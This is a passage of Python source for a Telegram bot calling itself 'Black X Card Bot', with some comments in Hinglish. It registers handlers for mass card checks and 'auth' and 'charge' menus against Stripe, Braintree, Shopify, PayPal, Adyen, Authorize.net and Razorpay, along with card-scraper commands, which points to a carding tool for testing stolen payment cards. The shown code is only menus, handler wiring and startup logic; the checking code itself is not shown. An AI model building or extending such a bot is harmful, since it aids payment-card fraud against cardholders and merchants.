            text += f"<b><i>Type:</i></b> <i>Free/Premium</i>\n"
            text += "━━━━━━━━━━━━━━━━━━━━━━\n"
        return text.strip()
    except Exception as e:
        logger.error(f"Error building page text: {e}")
        return "Error: Could not build page text."

def build_cmds_buttons(page_index: int) -> InlineKeyboardMarkup:
    """Build buttons for commands pagination"""
    buttons = []
    nav_buttons = []
    if page_index > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Back", callback_data=f"page_{page_index - 1}"))
    if page_index < len(PAGES) - 1:
        nav_buttons.append(InlineKeyboardButton("➡️ Next", callback_data=f"page_{page_index + 1}"))
    if nav_buttons:
        buttons.append(nav_buttons)
    buttons.append([InlineKeyboardButton("❌ Close", callback_data="close")])
    return InlineKeyboardMarkup(buttons)

def escape_html(text: str) -> str:
    """Escape HTML characters"""
    return html.escape(text, quote=False)
    
    # ==================== STOPCHK CALLBACK ====================
async def stopchk_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle stop button for mass stripe check"""
    query = update.callback_query
    await query.answer()
    
    # Extract user ID from callback data
    data = query.data
    if "stopchk_" in data:
        user_id = int(data.split("_")[1])
        
        # Check if the user clicking is the same as the one who started
        if query.from_user.id == user_id:
            await query.edit_message_text(
                "🛑 Mass Stripe check stopped by user.",
                parse_mode=ParseMode.HTML
            )
        else:
            await query.answer("Only the user who started this check can stop it.", show_alert=True)
    else:
        await query.edit_message_text(
            "❌ Invalid stop request.",
            parse_mode=ParseMode.HTML
        )

async def main_async():
    logger.info("🚀 Starting Black X Card Bot...")

    # Initialize database
    from db import init_db
    await init_db()
    
    # Initialize scraper - YEH LINE ADD KARO
    try:
        await initialize_scraper()
        logger.info("✅ Scraper initialized successfully!")
    except Exception as e:
        logger.warning(f"⚠️ Scraper initialization failed: {e}")

    # Build application
    application = ApplicationBuilder().token(TOKEN).build()
    
    # ========== REGISTER ALL HANDLERS ==========
    
    # 1. Callback handlers first
    register_sktxt_handlers(application)
    register_mstripe_callbacks(application)
    register_masspp_handlers(application)
    
    # 2. Command handlers
    register_user_commands(application)
    register_owner_commands(application)
    
    # 3. Specific command handlers
    application.add_handler(CommandHandler("sktxt", sktxt_command))
    application.add_handler(CommandHandler("mtxt", mtxt_command))
    application.add_handler(CommandHandler("masspp", masspp_command))
    
    # 4. Scraper commands
    application.add_handler(CommandHandler("scr", scr_command))
    application.add_handler(CommandHandler("mc", mc_command)) 
    application.add_handler(CommandHandler("clean", clean_command))
    
    # 5. Mass Gateway Callback Handlers
    application.add_handler(CallbackQueryHandler(mass_gateway_menu_handler, pattern="^mass_gateway_menu$"))
    application.add_handler(CallbackQueryHandler(mass_stripe_menu_handler, pattern="^mass_stripe_menu$"))
    application.add_handler(CallbackQueryHandler(mass_shopify_menu_handler, pattern="^mass_shopify_menu$"))
    application.add_handler(CallbackQueryHandler(mass_paypal_menu_handler, pattern="^mass_paypal_menu$"))
    application.add_handler(CallbackQueryHandler(mass_sk_stripe_menu_handler, pattern="^mass_sk_stripe_menu$"))
    
    application.add_handler(CallbackQueryHandler(stop_mtxt_handler, pattern=r"stop_mtxt_"))
    
    # 6. Menu and callback handlers
    application.add_handler(CallbackQueryHandler(gates_menu_handler, pattern="^gates_menu$"))
    application.add_handler(CallbackQueryHandler(tools_menu_handler, pattern="^tools_menu$"))
    application.add_handler(CallbackQueryHandler(tools_page_2_handler, pattern="^tools_page_2$"))
    application.add_handler(CallbackQueryHandler(auth_sub_menu_handler, pattern="^auth_sub_menu$"))
    application.add_handler(CallbackQueryHandler(stripe_auth_menu_handler, pattern="^stripe_auth_menu$"))
    application.add_handler(CallbackQueryHandler(braintree_auth_menu_handler, pattern="^braintree_auth_menu$"))
    application.add_handler(CallbackQueryHandler(charge_gateway_menu_handler, pattern="^charge_gateway_menu$"))
    application.add_handler(CallbackQueryHandler(auto_shopify_menu_handler, pattern="^auto_shopify_menu$"))
    application.add_handler(CallbackQueryHandler(stripe_charge_menu_handler, pattern="^stripe_charge_menu$"))
    application.add_handler(CallbackQueryHandler(authnet_menu_handler, pattern="^authnet_menu$"))
    application.add_handler(CallbackQueryHandler(ocean_menu_handler, pattern="^ocean_menu$"))
    application.add_handler(CallbackQueryHandler(adyen_menu_handler, pattern="^adyen_menu$"))
    application.add_handler(CallbackQueryHandler(paypal1_menu_handler, pattern="^paypal1_menu$"))
    application.add_handler(CallbackQueryHandler(paypal9_menu_handler, pattern="^paypal9_menu$"))
    application.add_handler(CallbackQueryHandler(razorpay_menu_handler, pattern="^razorpay_menu$"))
    application.add_handler(CallbackQueryHandler(cmds_pagination, pattern="^page_"))
    application.add_handler(CallbackQueryHandler(handle_close, pattern="^close$"))
    application.add_handler(CallbackQueryHandler(back_to_start_handler, pattern="^back_to_start$"))
    
    # Broadcast #
    application.add_handler(CallbackQueryHandler(handle_broadcast_callback, pattern="^broad_"))
    register_broadcast_handlers(application)
    # 7. Message handlers
    application.add_handler(MessageHandler(filters.TEXT & filters.ChatType.GROUPS, group_filter), group=1)
    
    # 8. Other callback handlers
    application.add_handler(CallbackQueryHandler(handle_callback))
    
    # ========== START BOT ==========
    logger.info("🤖 Bot is running...")
    
    try:
        await application.initialize()
        await application.start()
        
        # SIMPLE POLLING USE KARO - YEH FIX HAI
        await application.updater.start_polling(
            poll_interval=0.5,
            timeout=30,
            drop_pending_updates=True
        )
        
        logger.info("✅ Bot started successfully!")
        
        # Keep bot running - YEH SIMPLE VERSION USE KARO
        while True:
            await asyncio.sleep(1)
        
    except KeyboardInterrupt:
        logger.info("🛑 Stopped by user")
    except Exception as e:
        logger.exception(f"💥 Bot error: {e}")
    finally:
        # Proper shutdown
        try:
            if application.updater.running:
                await application.updater.stop()
            if application.running:
                await application.stop()
                await application.shutdown()
            logger.info("✅ Bot shutdown complete")
        except Exception as e:
            logger.error(f"Error during shutdown: {e}")

# ------------------  MAIN FUNCTION WITH FIXED SIGNAL HANDLING ------------------
def main():
    # Configure logging
    logging.basicConfig(
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        level=logging.INFO,
        handlers=[
            logging.StreamHandler(sys.stdout),
            logging.FileHandler("bot.log", mode='a', encoding='utf-8')
        ]
    )
    
    # Set higher recursion limit
    sys.setrecursionlimit(10000)
    
    # Set event loop policy
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    else:
        asyncio.set_event_loop_policy(asyncio.DefaultEventLoopPolicy())
    
    # Signal handling
    def signal_handler(signum, frame):
        logger = logging.getLogger(__name__)
        logger.info(f"🛑 Signal {signum} received - shutting down")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Run bot with restart on crash
    max_restarts = 5
    restart_count = 0
    
    while restart_count < max_restarts:
        try:
            asyncio.run(main_async())
            break  # Exit loop if bot stops normally
        except KeyboardInterrupt:
            logger.info("🛑 Stopped by user")
            break
        except SystemExit:
            logger.info("🛑 System exit")
            break
        except Exception as e:
            restart_count += 1
            logger.exception(f"💥 Bot crashed (attempt {restart_count}/{max_restarts}): {e}")
            
            if restart_count < max_restarts:
                logger.info(f"🔄 Restarting in 5 seconds...")
                time.sleep(5)
            else:
                logger.error("🚨 Max restart attempts reached. Bot stopped.")
                break

if __name__ == "__main__":
    main()